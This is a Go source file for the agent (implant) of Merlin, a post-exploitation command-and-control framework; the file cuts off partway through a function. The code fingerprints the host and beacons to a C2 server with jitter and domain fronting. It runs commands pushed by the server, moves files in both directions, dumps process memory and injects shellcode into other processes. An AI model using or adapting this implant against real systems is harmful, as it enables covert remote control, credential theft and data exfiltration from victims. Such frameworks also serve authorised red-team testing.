// Merlin is a post-exploitation command and control framework.
// This file is part of Merlin.
// Copyright (C) 2019  Russel Van Tuyl

// Merlin is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// any later version.

// Merlin is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.

// You should have received a copy of the GNU General Public License
// along with Merlin.  If not, see <http://www.gnu.org/licenses/>.

package agent

import (
	// Standard
	"bytes"
	cryptorand "crypto/rand"
	"crypto/rsa"
	"crypto/sha1" // #nosec G505
	"crypto/sha256"
	"crypto/tls"
	"encoding/base64"
	"encoding/gob"
	"fmt"
	"io"
	"io/ioutil"
	"math/rand"
	"net"
	"net/http"
	"net/url"
	"os"
	"os/user"
	"path/filepath"
	"runtime"
	"strconv"
	"strings"
	"time"

	// 3rd Party
	"github.com/cretz/gopaque/gopaque"
	"github.com/fatih/color"
	"github.com/lucas-clemente/quic-go"
	"github.com/lucas-clemente/quic-go/h2quic"
	"github.com/satori/go.uuid"
	"golang.org/x/crypto/pbkdf2"
	"golang.org/x/net/http2"
	"gopkg.in/square/go-jose.v2"
	"gopkg.in/square/go-jose.v2/jwt"

	// Merlin
	"github.com/Ne0nd0g/merlin/pkg"
	"github.com/Ne0nd0g/merlin/pkg/core"
	"github.com/Ne0nd0g/merlin/pkg/messages"
)

// GLOBAL VARIABLES
var build = "nonRelease" // build is the build number of the Merlin Agent program set at compile time

//TODO this is a duplicate with agents/agents.go, centralize

// Agent is a structure for agent objects. It is not exported to force the use of the New() function
type Agent struct {
	ID            uuid.UUID       // ID is a Universally Unique Identifier per agent
	Platform      string          // Platform is the operating system platform the agent is running on (i.e. windows)
	Architecture  string          // Architecture is the operating system architecture the agent is running on (i.e. amd64)
	UserName      string          // UserName is the username that the agent is running as
	UserGUID      string          // UserGUID is a Globally Unique Identifier associated with username
	HostName      string          // HostName is the computer's host name
	Ips           []string        // Ips is a slice of all the IP addresses assigned to the host's interfaces
	Pid           int             // Pid is the Process ID that the agent is running under
	iCheckIn      time.Time       // iCheckIn is a timestamp of the agent's initial check in time
	sCheckIn      time.Time       // sCheckIn is a timestamp of the agent's last status check in time
	Version       string          // Version is the version number of the Merlin Agent program
	Build         string          // Build is the build number of the Merlin Agent program
	WaitTime      time.Duration   // WaitTime is how much time the agent waits in-between checking in
	PaddingMax    int             // PaddingMax is the maximum size allowed for a randomly selected message padding length
	MaxRetry      int             // MaxRetry is the maximum amount of failed check in attempts before the agent quits
	FailedCheckin int             // FailedCheckin is a count of the total number of failed check ins
	Skew          int64           // Skew is size of skew added to each WaitTime to vary check in attempts
	Verbose       bool            // Verbose enables verbose messages to standard out
	Debug         bool            // Debug enables debug messages to standard out
	Proto         string          // Proto contains the transportation protocol the agent is using (i.e. h2 or hq)
	Client        *http.Client    // Client is an http.Client object used to make HTTP connections for agent communications
	UserAgent     string          // UserAgent is the user agent string used with HTTP connections
	initial       bool            // initial identifies if the agent has successfully completed the first initial check in
	KillDate      int64           // killDate is a unix timestamp that denotes a time the executable will not run after (if it is 0 it will not be used)
	RSAKeys       *rsa.PrivateKey // RSA Private/Public key pair; Private key used to decrypt messages
	PublicKey     rsa.PublicKey   // Public key (of server) used to encrypt messages
	secret        []byte          // secret is used to perform symmetric encryption operations
	JWT           string          // Authentication JSON Web Token
	URL           string          // The C2 server URL
	Host          string          // HTTP Host header, typically used with Domain Fronting
	pwdU          []byte          // SHA256 hash from 5000 iterations of PBKDF2 with a 30 character random string input
	psk           string          // Pre-Shared Key
}

// New creates a new agent struct with specific values and returns the object
func New(protocol string, url string, host string, psk string, proxy string, verbose bool, debug bool) (Agent, error) {
	if debug {
		message("debug", "Entering agent.New function")
	}
	a := Agent{
		ID:           uuid.NewV4(),
		Platform:     runtime.GOOS,
		Architecture: runtime.GOARCH,
		Pid:          os.Getpid(),
		Version:      merlin.Version,
		WaitTime:     30000 * time.Millisecond,
		PaddingMax:   4096,
		MaxRetry:     7,
		Skew:         3000,
		Verbose:      verbose,
		Debug:        debug,
		Proto:        protocol,
		UserAgent:    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.85 Safari/537.36",
		initial:      false,
		KillDate:     0,
		URL:          url,
		Host:         host,
	}

	u, errU := user.Current()
	if errU != nil {
		return a, fmt.Errorf("there was an error getting the current user:\r\n%s", errU)
	}

	a.UserName = u.Username
	a.UserGUID = u.Gid

	h, errH := os.Hostname()
	if errH != nil {
		return a, fmt.Errorf("there was an error getting the hostname:\r\n%s", errH)
	}

	a.HostName = h

	interfaces, errI := net.Interfaces()
	if errI != nil {
		return a, fmt.Errorf("there was an error getting the IP addresses:\r\n%s", errI)
	}

	for _, iface := range interfaces {
		addrs, err := iface.Addrs()
		if err == nil {
			for _, addr := range addrs {
				a.Ips = append(a.Ips, addr.String())
			}
		} else {
			return a, fmt.Errorf("there was an error getting interface information:\r\n%s", err)
		}
	}

	client, errClient := getClient(a.Proto, proxy)
	if errClient != nil {
		return a, fmt.Errorf("there was an error getting a transport client:\r\n%s", errClient)
	}

	a.Client = client

	// Generate a random password and run it through 5000 iterations of PBKDF2; Used with OPAQUE
	x := core.RandStringBytesMaskImprSrc(30)
	a.pwdU = pbkdf2.Key([]byte(x), a.ID.Bytes(), 5000, 32, sha256.New)

	// Set encryption secret to pre-authentication pre-shared key
	a.psk = psk

	// Generate RSA key pair
	privateKey, rsaErr := rsa.GenerateKey(cryptorand.Reader, 4096)
	if rsaErr != nil {
		return a, fmt.Errorf("there was an error generating the RSA key pair:\r\n%s", rsaErr)
	}

	a.RSAKeys = privateKey

	if a.Verbose {
		message("info", "Host Information:")
		message("info", fmt.Sprintf("\tAgent UUID: %s", a.ID))
		message("info", fmt.Sprintf("\tPlatform: %s", a.Platform))
		message("info", fmt.Sprintf("\tArchitecture: %s", a.Architecture))
		message("info", fmt.Sprintf("\tUser Name: %s", a.UserName)) //TODO A username like _svctestaccont causes error
		message("info", fmt.Sprintf("\tUser GUID: %s", a.UserGUID))
		message("info", fmt.Sprintf("\tHostname: %s", a.HostName))
		message("info", fmt.Sprintf("\tPID: %d", a.Pid))
		message("info", fmt.Sprintf("\tIPs: %v", a.Ips))
		message("info", fmt.Sprintf("\tProtocol: %s", a.Proto))
		message("info", fmt.Sprintf("\tProxy: %v", proxy))
	}
	if debug {
		message("debug", "Leaving agent.New function")
	}
	return a, nil
}

// Run instructs an agent to establish communications with the passed in server using the passed in protocol
func (a *Agent) Run() error {
	rand.Seed(time.Now().UTC().UnixNano())

	if a.Verbose {
		message("note", fmt.Sprintf("Agent version: %s", merlin.Version))
		message("note", fmt.Sprintf("Agent build: %s", build))
	}

	for {
		// Check killdate to see if the agent should checkin
		if (a.KillDate == 0) || (time.Now().Unix() < a.KillDate) {
			if a.initial {
				if a.Verbose {
					message("note", "Checking in...")
				}
				go a.statusCheckIn()
			} else {
				a.initial = a.initialCheckIn(a.Client)
			}
			if a.FailedCheckin >= a.MaxRetry {
				return fmt.Errorf("maximum number of failed checkin attempts reached: %d", a.MaxRetry)
			}
		} else {
			return fmt.Errorf("agent kill date has been exceeded: %s", time.Unix(a.KillDate, 0).UTC().Format(time.RFC3339))
		}

		timeSkew := time.Duration(0)

		if a.Skew > 0 {
			timeSkew = time.Duration(rand.Int63n(a.Skew)) * time.Millisecond
		}

		totalWaitTime := a.WaitTime + timeSkew

		if a.Verbose {
			message("note", fmt.Sprintf("Sleeping for %s at %s", totalWaitTime.String(), time.Now().UTC().Format(time.RFC3339)))
		}
		time.Sleep(totalWaitTime)
	}
}

func (a *Agent) initialCheckIn(client *http.Client) bool {

	if a.Debug {
		message("debug", "Entering initialCheckIn function")
	}

	// Register
	errOPAQUEReg := a.opaqueRegister()
	if errOPAQUEReg != nil {
		a.FailedCheckin++
		if a.Verbose {
			message("warn", errOPAQUEReg.Error())
			message("note", fmt.Sprintf("%d out of %d total failed checkins", a.FailedCheckin, a.MaxRetry))
		}
		return false
	}

	// Authenticate
	errOPAQUEAuth := a.opaqueAuthenticate()
	if errOPAQUEAuth != nil {
		a.FailedCheckin++
		if a.Verbose {
			message("warn", errOPAQUEAuth.Error())
			message("note", fmt.Sprintf("%d out of %d total failed checkins", a.FailedCheckin, a.MaxRetry))
		}
		return false
	}

	// Now that the agent is authenticated, send in agent info
	infoResponse, errAgentInfo := a.sendMessage("POST", a.getAgentInfoMessage())
	if errAgentInfo != nil {
		a.FailedCheckin++
		if a.Verbose {
			message("warn", errAgentInfo.Error())
			message("note", fmt.Sprintf("%d out of %d total failed checkins", a.FailedCheckin, a.MaxRetry))
		}
		return false
	}
	_, errHandler := a.messageHandler(infoResponse)
	if errHandler != nil {
		if a.Verbose {
			message("warn", errHandler.Error())
		}
	}

	// Send RSA keys encrypted using authentication derived secret
	errRSA := a.rsaKeyExchange()
	if errRSA != nil {
		if a.Verbose {
			message("warn", errRSA.Error())
		}
	}

	if a.FailedCheckin > 0 && a.FailedCheckin < a.MaxRetry {
		if a.Verbose {
			message("note", fmt.Sprintf("Updating server with failed checkins from %d to 0", a.FailedCheckin))
		}
		a.FailedCheckin = 0
		infoResponse, err := a.sendMessage("POST", a.getAgentInfoMessage())
		if err != nil {
			if a.Verbose {
				message("warn", err.Error())
			}
			return false
		}
		_, errHandler2 := a.messageHandler(infoResponse)
		if errHandler2 != nil {
			if a.Verbose {
				message("warn", errHandler2.Error())
			}
		}
	}

	if a.Debug {
		message("debug", "Leaving initialCheckIn function, returning True")
	}
	a.iCheckIn = time.Now().UTC()
	return true
}

func (a *Agent) statusCheckIn() {
	statusMessage := messages.Base{
		Version: 1.0,
		ID:      a.ID,
		Type:    "StatusCheckIn",
		Padding: core.RandStringBytesMaskImprSrc(a.PaddingMax),
	}

	j, reqErr := a.sendMessage("POST", statusMessage)

	if reqErr != nil {
		a.FailedCheckin++
		if a.Verbose {
			message("warn", reqErr.Error())
			message("note", fmt.Sprintf("%d out of %d total failed checkins", a.FailedCheckin, a.MaxRetry))
		}
		return
	}

	a.FailedCheckin = 0
	a.sCheckIn = time.Now().UTC()

	if a.Debug {
		message("debug", fmt.Sprintf("Agent ID: %s", j.ID))
		message("debug", fmt.Sprintf("Message Type: %s", j.Type))
		message("debug", fmt.Sprintf("Message Payload: %s", j.Payload))
	}

	// handle message
	m, err := a.messageHandler(j)
	if err != nil {
		if a.Verbose {
			message("warn", err.Error())
		}
		return
	}

	// Used when the message was ServerOK, no further processing is needed
	if m.Type == "" {
		return
	}

	_, errR := a.sendMessage("post", m)
	if errR != nil {
		if a.Verbose {
			message("warn", errR.Error())
		}
		return
	}

}

// getClient returns a HTTP client for the passed in protocol (i.e. h2 or hq)
func getClient(protocol string, proxyURL string) (*http.Client, error) {

	/* #nosec G402 */
	// G402: TLS InsecureSkipVerify set true. (Confidence: HIGH, Severity: HIGH) Allowed for testing
	// Setup TLS configuration
	TLSConfig := &tls.Config{
		MinVersion:         tls.VersionTLS12,
		InsecureSkipVerify: true, // #nosec G402 - see https://github.com/Ne0nd0g/merlin/issues/59 TODO fix this
		CipherSuites: []uint16{
			tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
			tls.TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA,
		},
		NextProtos: []string{protocol},
	}

	switch strings.ToLower(protocol) {
	case "hq":
		transport := &h2quic.RoundTripper{
			QuicConfig:      &quic.Config{IdleTimeout: 168 * time.Hour},
			TLSClientConfig: TLSConfig,
		}
		return &http.Client{Transport: transport}, nil
	case "h2":
		transport := &http2.Transport{
			TLSClientConfig: TLSConfig,
		}
		return &http.Client{Transport: transport}, nil
	case "https":
		if proxyURL != "" {
			rawURL, errProxy := url.Parse(proxyURL)
			if errProxy != nil {
				return nil, fmt.Errorf("there was an error parsing the proxy string:\r\n%s", errProxy.Error())
			}
			proxy := http.ProxyURL(rawURL)
			transport := &http.Transport{
				TLSClientConfig: TLSConfig,
				Proxy:           proxy,
			}
			return &http.Client{Transport: transport}, nil
		}

		transport := &http.Transport{
			TLSClientConfig: TLSConfig,
		}
		return &http.Client{Transport: transport}, nil
	default:
		return nil, fmt.Errorf("%s is not a valid client protocol", protocol)
	}
}

// sendMessage is a generic function to receive a messages.Base struct, encode it, encrypt it, and send it to the server
// The response message will be decrypted, decoded, and return a messages.Base struct.
func (a *Agent) sendMessage(method string, m messages.Base) (messages.Base, error) {
	if a.Debug {
		message("debug", "Entering into agent.sendMessage")
	}
	if a.Verbose {
		message("note", fmt.Sprintf("Sending %s message to %s", m.Type, a.URL))
	}

	var returnMessage messages.Base

	// Convert messages.Base to gob
	messageBytes := new(bytes.Buffer)
	errGobEncode := gob.NewEncoder(messageBytes).Encode(m)
	if errGobEncode != nil {
		return returnMessage, fmt.Errorf("there was an error encoding the %s message to a gob:\r\n%s", m.Type, errGobEncode.Error())
	}

	// Get JWE
	jweString, errJWE := core.GetJWESymetric(messageBytes.Bytes(), a.secret)
	if errJWE != nil {
		return returnMessage, errJWE
	}

	// Encode JWE into gob
	jweBytes := new(bytes.Buffer)
	errJWEBuffer := gob.NewEncoder(jweBytes).Encode(jweString)
	if errJWEBuffer != nil {
		return returnMessage, fmt.Errorf("there was an error encoding the %s JWE string to a gob:\r\n%s", m.Type, errJWEBuffer.Error())
	}

	switch strings.ToLower(method) {
	case "post":
		req, reqErr := http.NewRequest("POST", a.URL, jweBytes)
		if reqErr != nil {
			return returnMessage, fmt.Errorf("there was an error building the HTTP request:\r\n%s", reqErr.Error())
		}

		if req != nil {
			req.Header.Set("User-Agent", a.UserAgent)
			req.Header.Set("Content-Type", "application/octet-stream; charset=utf-8")
			req.Header.Set("Authorization", fmt.Sprintf("Bearer %s", a.JWT))
			if a.Host != "" {
				req.Host = a.Host
			}
		}

		// Send the request
		resp, err := a.Client.Do(req)
		if err != nil {
			return returnMessage, fmt.Errorf("there was an error with the HTTP client while performing a POST:\r\n%s", err.Error())
		}
		if a.Debug {
			message("debug", fmt.Sprintf("HTTP Response:\r\n%+v", resp))
		}
		if resp.StatusCode != 200 {
			return returnMessage, fmt.Errorf("there was an error communicating with the server:\r\n%d", resp.StatusCode)
		}

		contentType := resp.Header.Get("Content-Type")
		if contentType == "" {
			return returnMessage, fmt.Errorf("the response did not contain a Content-Type header")
		}

		// Check to make sure the response contains the application/octet-stream Content-Type header
		isOctet := false
		for _, v := range strings.Split(contentType, ",") {
			if strings.ToLower(v) == "application/octet-stream" {
				isOctet = true
			}
		}

		if !isOctet {
			return returnMessage, fmt.Errorf("the response message did not contain the application/octet-stream Content-Type header")
		}

		// Check to make sure message response contained data
		if resp.ContentLength == 0 {
			return returnMessage, fmt.Errorf("the response message did not contain any data")
		}

		var jweString string

		// Decode GOB from server response into JWE
		errD := gob.NewDecoder(resp.Body).Decode(&jweString)
		if errD != nil {
			return returnMessage, fmt.Errorf("there was an error decoding the gob message:\r\n%s", errD.Error())
		}

		// Decrypt JWE to messages.Base
		respMessage, errDecrypt := core.DecryptJWE(jweString, a.secret)
		if errDecrypt != nil {
			return returnMessage, errDecrypt
		}

		// Verify UUID matches
		if respMessage.ID != a.ID {
			if a.Verbose {
				return returnMessage, fmt.Errorf("response message agent ID %s does not match current ID %s", respMessage.ID.String(), a.ID.String())
			}
		}
		return respMessage, nil
	default:
		return returnMessage, fmt.Errorf("%s is an invalid method for sending a message", method)
	}
}

// messageHandler looks at the message type and performs the associated action
func (a *Agent) messageHandler(m messages.Base) (messages.Base, error) {
	if a.Debug {
		message("debug", "Entering into agent.messageHandler function")
	}
	if a.Verbose {
		message("success", fmt.Sprintf("%s message type received!", m.Type))
	}

	returnMessage := messages.Base{
		Version: 1.0,
		ID:      a.ID,
		Padding: core.RandStringBytesMaskImprSrc(a.PaddingMax),
	}

	if a.ID != m.ID {
		return returnMessage, fmt.Errorf("the input message UUID did not match this agent's UUID")
	}
	var c messages.CmdResults
	if m.Token != "" {
		a.JWT = m.Token
	}

	switch m.Type {
	case "FileTransfer":
		p := m.Payload.(messages.FileTransfer)
		c.Job = p.Job
		// Agent will be downloading a file from the server
		if p.IsDownload {
			if a.Verbose {
				message("note", "FileTransfer type: Download")
			}

			d, _ := filepath.Split(p.FileLocation)
			_, directoryPathErr := os.Stat(d)
			if directoryPathErr != nil {
				c.Stderr = fmt.Sprintf("There was an error getting the FileInfo structure for the remote "+
					"directory %s:\r\n", p.FileLocation)
				c.Stderr += directoryPathErr.Error()
			}
			if c.Stderr == "" {
				if a.Verbose {
					message("note", fmt.Sprintf("Writing file to %s", p.FileLocation))
				}
				downloadFile, downloadFileErr := base64.StdEncoding.DecodeString(p.FileBlob)
				if downloadFileErr != nil {
					c.Stderr = downloadFileErr.Error()
				} else {
					errF := ioutil.WriteFile(p.FileLocation, downloadFile, 0644)
					if errF != nil {
						c.Stderr = errF.Error()
					} else {
						c.Stdout = fmt.Sprintf("Successfully uploaded file to %s on agent %s", p.FileLocation, a.ID.String())
					}
				}
			}
		}
		// Agent will uploading a file to the server
		if !p.IsDownload {
			if a.Verbose {
				message("note", "FileTransfer type: Upload")
			}

			fileData, fileDataErr := ioutil.ReadFile(p.FileLocation)
			if fileDataErr != nil {
				if a.Verbose {
					message("warn", fmt.Sprintf("There was an error reading %s", p.FileLocation))
					message("warn", fileDataErr.Error())
				}
				c.Stderr = fmt.Sprintf("there was an error reading %s:\r\n%s", p.FileLocation, fileDataErr.Error())
			} else {
				fileHash := sha1.New() // #nosec G401 // Use SHA1 because it is what many Blue Team tools use
				_, errW := io.WriteString(fileHash, string(fileData))
				if errW != nil {
					if a.Verbose {
						message("warn", fmt.Sprintf("There was an error generating the SHA1 file hash e:\r\n%s", errW.Error()))
					}
				}

				if a.Verbose {
					message("note", fmt.Sprintf("Uploading file %s of size %d bytes and a SHA1 hash of %x to the server",
						p.FileLocation,
						len(fileData),
						fileHash.Sum(nil)))
				}
				ft := messages.FileTransfer{
					FileLocation: p.FileLocation,
					FileBlob:     base64.StdEncoding.EncodeToString([]byte(fileData)),
					IsDownload:   true,
					Job:          p.Job,
				}

				returnMessage.Type = "FileTransfer"
				returnMessage.Payload = ft
				return returnMessage, nil
			}
		}
	case "CmdPayload":
		p := m.Payload.(messages.CmdPayload)
		c.Job = p.Job
		c.Stdout, c.Stderr = a.executeCommand(p)
	case "ServerOk":
		if a.Verbose {
			message("note", "Received Server OK, doing nothing")
		}
		return returnMessage, nil
	case "Module":
		if a.Verbose {
			message("note", "Received Agent Module Directive")
		}
		p := m.Payload.(messages.Module)
		c.Job = p.Job
		switch p.Command {
		case "Minidump":
			if a.Verbose {
				message("note", "Received Minidump request")
			}

			//ensure the provided args are valid
			if len(p.Args) < 2 {
				//not enough args
				c.Stderr = "not enough arguments provided to the Minidump module to dump a process"
				break
			}
			process := p.Args[0]
			pid, err := strconv.ParseInt(p.Args[1], 0, 32)
			if err != nil {
				c.Stderr = fmt.Sprintf("minidump module could not parse PID as an integer:%s\r\n%s", p.Args[1], err.Error())
				break
			}

			tempPath := ""
			if len(p.Args) == 3 {
				tempPath = p.Args[2]
			}

			// Get minidump
			miniD, miniDumpErr := miniDump(tempPath, process, uint32(pid))

			//copied and pasted from upload func, modified appropriately
			if miniDumpErr != nil {
				c.Stderr = fmt.Sprintf("There was an error executing the miniDump module:\r\n%s",
					miniDumpErr.Error())
			} else {
				fileHash := sha256.New()
				_, errW := io.WriteString(fileHash, string(miniD["FileContent"].([]byte)))
				if errW != nil {
					if a.Verbose {
						message("warn", fmt.Sprintf("There was an error generating the SHA256 file hash e:\r\n%s", errW.Error()))
					}
				}

				if a.Verbose {
					message("note", fmt.Sprintf("Uploading minidump file of size %d bytes and a SHA1 hash of %x to the server",
						len(miniD["FileContent"].([]byte)),
						fileHash.Sum(nil)))
				}
				fileTransferMessage := messages.FileTransfer{
					FileLocation: fmt.Sprintf("%s.%d.dmp", miniD["ProcName"], miniD["ProcID"]),
					FileBlob:     base64.StdEncoding.EncodeToString(miniD["FileContent"].([]byte)),
					IsDownload:   true,
					Job:          p.Job,
				}

				returnMessage.Type = "FileTransfer"
				returnMessage.Payload = fileTransferMessage
				return returnMessage, nil
			}
		default:
			c.Stderr = fmt.Sprintf("%s is not a valid module type", p.Command)
		}
	case "AgentControl":
		if a.Verbose {
			message("note", "Received Agent Control Message")
		}
		p := m.Payload.(messages.AgentControl)
		c.Job = p.Job
		switch p.Command {
		case "kill":
			if a.Verbose {
				message("note", "Received Agent Kill Message")
			}
			os.Exit(0)
		case "sleep":
			if a.Verbose {
				message("note", fmt.Sprintf("Setting agent sleep time to %s", p.Args))
			}
			t, err := time.ParseDuration(p.Args)
			if err != nil {
				c.Stderr = fmt.Sprintf("there was an error changing the agent waitTime:\r\n%s", err.Error())
				break
			}
			if t > 0 {
				a.WaitTime = t
			} else {
				c.Stderr = fmt.Sprintf("the agent was provided with a time that was not greater than zero:\r\n%s", t.String())
				break
			}
		case "skew":
			t, err := strconv.ParseInt(p.Args, 10, 64)
			if err != nil {
				c.Stderr = fmt.Sprintf("there was an error changing the agent skew interval:\r\n%s", err.Error())
				break
			}
			if a.Verbose {
				message("note", fmt.Sprintf("Setting agent skew interval to %d", t))
			}
			a.Skew = t
		case "padding":
			t, err := strconv.Atoi(p.Args)
			if err != nil {
				c.Stderr = fmt.Sprintf("there was an error changing the agent message padding size:\r\n%s", err.Error())
				break
			}
			if a.Verbose {
				message("note", fmt.Sprintf("Setting agent message maximum padding size to %d", t))
			}
			a.PaddingMax = t
		case "initialize":
			if a.Verbose {
				message("note", "Received agent re-initialize message")
			}
			a.initial = false
		case "maxretry":
			t, err := strconv.Atoi(p.Args)
			if err != nil {
				c.Stderr = fmt.Sprintf("There was an error changing the agent max retries:\r\n%s", err.Error())
				break
			}
			if a.Verbose {
				message("note", fmt.Sprintf("Setting agent max retries to %d", t))
			}
			a.MaxRetry = t
		case "killdate":
			d, err := strconv.Atoi(p.Args)
			if err != nil {
				c.Stderr = fmt.Sprintf("there was an error converting the kill date to an integer:\r\n%s", err.Error())
				break
			}
			a.KillDate = int64(d)
			if a.Verbose {
				message("info", fmt.Sprintf("Set Kill Date to: %s",
					time.Unix(a.KillDate, 0).UTC().Format(time.RFC3339)))
			}
		default:
			c.Stderr = fmt.Sprintf("%s is not a valid AgentControl message type.", p.Command)
		}
		return a.getAgentInfoMessage(), nil
	case "Shellcode":
		if a.Verbose {
			message("note", "Received Execute shellcode command")
		}

		s := m.Payload.(messages.Shellcode)
		var e error
		c.Job = s.Job
		e = a.executeShellcode(s) // Execution method determined in function

		if e != nil {
			c.Stderr = fmt.Sprintf("there was an error with the shellcode module:\r\n%s", e.Error())
		} else {
			c.Stdout = "Shellcode module executed without errors"
		}
	case "NativeCmd":
		p := m.Payload.(messages.NativeCmd)
		c.Job = p.Job
		switch p.Command {
		case "ls":
			listing, err := a.list(p.Args)
			if err != nil {
				c.Stderr = fmt.Sprintf("there was an error executing the 'ls' command:\r\n%s", err.Error())
				break
			}
			c.Stdout = listing
		case "cd":
			err := os.Chdir(p.Args)
			if err != nil {
				c.Stderr = fmt.Sprintf("there was an error changing directories when executing the 'cd' command:\r\n%s", err.Error())
			} else {
				path, pathErr := os.Getwd()
				if pathErr != nil {
					c.Stderr = fmt.Sprintf("there was an error getting the working directory when executing the 'cd' command:\r\n%s", pathErr.Error())
				} else {
					c.Stdout = fmt.Sprintf("Changed working directory to %s", path)
				}
			}
		case "pwd":
			dir, err := os.Getwd()
			if err != nil {
				c.Stderr = fmt.Sprintf("there was an error getting the working directory when executing the 'pwd' command:\r\n%s", err.Error())
			} else {
				c.Stdout = fmt.Sprintf("Current working directory: %s", dir)
			}
		default:
			c.Stderr = fmt.Sprintf("%s is not a valid NativeCMD type", p.Command)
		}
	case "KeyExchange":
		p := m.Payload.(messages.KeyExchange)
		a.PublicKey = p.PublicKey
		return returnMessage, nil
	case "ReAuthenticate":
		if a.Verbose {
			message("note", "Re-authenticating with OPAQUE protocol")
		}

		errAuth := a.opaqueAuthenticate()
		if errAuth != nil {
			return returnMessage, fmt.Errorf("there was an error during OPAQUE Re-Authentication:\r\n%s", errAuth)
		}
		m.Type = ""
		return returnMessage, nil
	default:
		return returnMessage, fmt.Errorf("%s is not a valid message type", m.Type)
	}

	if a.Verbose && c.Stdout != "" {
		message("success", c.Stdout)
	}
	if a.Verbose && c.Stderr != "" {
		message("warn", c.Stderr)
	}

	returnMessage.Type = "CmdResults"
	returnMessage.Payload = c
	if a.Debug {
		message("debug", "Leaving agent.messageHandler function without error")
	}
	return returnMessage, nil
}

func (a *Agent) executeCommand(j messages.CmdPayload) (stdout string, stderr string) {
	if a.Debug {
		message("debug", fmt.Sprintf("Received input parameter for executeCommand function: %s", j))

	} else if a.Verbose {
		message("success", fmt.Sprintf("Executing command %s %s", j.Command, j.Args))
	}

	stdout, stderr = ExecuteCommand(j.Command, j.Args)

	if a.Verbose {
		if stderr != "" {
			message("warn", fmt.Sprintf("There was an error executing the command: %s", j.Command))
			message("success", stdout)
			message("warn", fmt.Sprintf("Error: %s", stderr))

		} else {
			message("success", fmt.Sprintf("Command output:\r\n\r\n%s", stdout))
		}
	}

	return stdout, stderr
}

func (a *Agent) executeShellcode(shellcode messages.Shellcode) error {

	if a.Debug {
		message("debug", fmt.Sprintf("Received input parameter for executeShellcode function: %v", shellcode))
	}

	shellcodeBytes, errDecode := base64.StdEncoding.DecodeString(shellcode.Bytes)

	if errDecode != nil {
		if a.Verbose {
			message("warn", fmt.Sprintf("There was an error decoding the Base64 string: %s", shellcode.Bytes))
			message("warn", errDecode.Error())
		}
		return errDecode
	}

	if a.Verbose {
		message("info", fmt.Sprintf("Shelcode execution method: %s", shellcode.Method))
	}
	if a.Debug {
		message("info", fmt.Sprintf("Executing shellcode %s", shellcodeBytes))
	}

	if shellcode.Method == "self" {
		err := ExecuteShellcodeSelf(shellcodeBytes)
		if err != nil {
			if a.Verbose {
				message("warn", fmt.Sprintf("There was an error executing the shellcode: \r\n%s", shellcodeBytes))
				message("warn", fmt.Sprintf("Error: %s", err.Error()))
			}
		} else {
			if a.Verbose {
				message("success", "Shellcode was successfully executed")
			}
		}
		return err
	} else if shellcode.Method == "remote" {
		err := ExecuteShellcodeRemote(shellcodeBytes, shellcode.PID)
		if err != nil {
			if a.Verbose {
				message("warn", fmt.Sprintf("There was an error executing the shellcode: \r\n%s", shellcodeBytes))
				message("warn", fmt.Sprintf("Error: %s", err.Error()))
			}
		} else {
			if a.Verbose {
				message("success", "Shellcode was successfully executed")
			}
		}
		return err
	} else if shellcode.Method == "rtlcreateuserthread" {
		err := ExecuteShellcodeRtlCreateUserThread(shellcodeBytes, shellcode.PID)
		if err != nil {
			if a.Verbose {
				message("warn", fmt.Sprintf("There was an error executing the shellcode: \r\n%s", shellcodeBytes))
				message("warn", fmt.Sprintf("Error: %s", err.Error()))
			}
		} else {
			if a.Verbose {
				message("success", "Shellcode was successfully executed")
			}
		}
		return err
	} else if shellcode.Method == "userapc" {
		err := ExecuteShellcodeQueueUserAPC(shellcodeBytes, shellcode.PID)
		if err != nil {
			if a.Verbose {
				message("warn", fmt.Sprintf("There was an error executing the shellcode: \r\n%s", shellcodeBytes))
				message("warn", fmt.Sprintf("Error: %s", err.Error()))
			}
		} else {
			if a.Verbose {
				message("success", "Shellcode was successfully executed")
			}
		}
		return err
	} else {
		if a.Verbose {
			message("warn", fmt.Sprintf("Invalid shellcode execution method: %s", shellcode.Method))
		}
		return fmt.Errorf("invalid shellcode execution method %s", shellcode.Method)
	}
}

func (a *Agent) list(path string) (string, error) {
	if a.Debug {
		message("debug", fmt.Sprintf("Received input parameter for list command function: %s", path))

	} else if a.Verbose {
		message("success", fmt.Sprintf("listing directory contents for: %s", path))
	}

	// Resolve relative path to absolute
	aPath, errPath := filepath.Abs(path)
	if errPath != nil {
		return "", errPath
	}
	files, err := ioutil.ReadDir(aPath)

	if err != nil {
		return "", err
	}

	details := fmt.Sprintf("Directory listing for: %s\r\n\r\n", aPath)

	for _, f := range files {
		perms := f.Mode().String()
		size := strconv.FormatInt(f.Size(), 10)
		modTime := f.ModTime().String()[0:19]
		name := f.Name()
		details = details + perms + "\t" + modTime + "\t" + size + "\t" + name + "\n"
	}
	return details, nil
}

//opaqueRegister is used to perform the OPAQUE Password Authenticated Key Exchange (PAKE) protocol Registration
func (a *Agent) opaqueRegister() error {

	if a.Verbose {
		message("note", "Starting OPAQUE Registration")
	}

	// Build OPAQUE User Registration Initialization
	userReg := gopaque.NewUserRegister(gopaque.CryptoDefault, a.ID.Bytes(), nil)
	userRegInit := userReg.Init(a.pwdU)

	if a.Debug {
		message("debug", fmt.Sprintf("OPAQUE UserID: %v", userRegInit.UserID))
		message("debug", fmt.Sprintf("OPAQUE Alpha: %v", userRegInit.Alpha))
		message("debug", fmt.Sprintf("OPAQUE PwdU: %s", a.pwdU))
	}

	userRegInitBytes, errUserRegInitBytes := userRegInit.ToBytes()
	if errUserRegInitBytes != nil {
		return fmt.Errorf("there was an error marshalling the OPAQUE user registration initialization message to bytes:\r\n%s", errUserRegInitBytes.Error())
	}

	// Message to be sent to the server
	regInitBase := messages.Base{
		Version: 1.0,
		ID:      a.ID,
		Type:    "RegInit",
		Payload: userRegInitBytes,
		Padding: core.RandStringBytesMaskImprSrc(a.PaddingMax),
	}

	// Set secret for JWT and JWE encryption key from PSK
	k := sha256.Sum256([]byte(a.psk))
	a.secret = k[:]

	// Create JWT using pre-authentication pre-shared key; updated by server after authentication
	agentJWT, errJWT := a.getJWT()
	if errJWT != nil {
		return fmt.Errorf("there was an erreor getting the initial JWT during OPAQUE registration:\r\n%s", errJWT)
	}
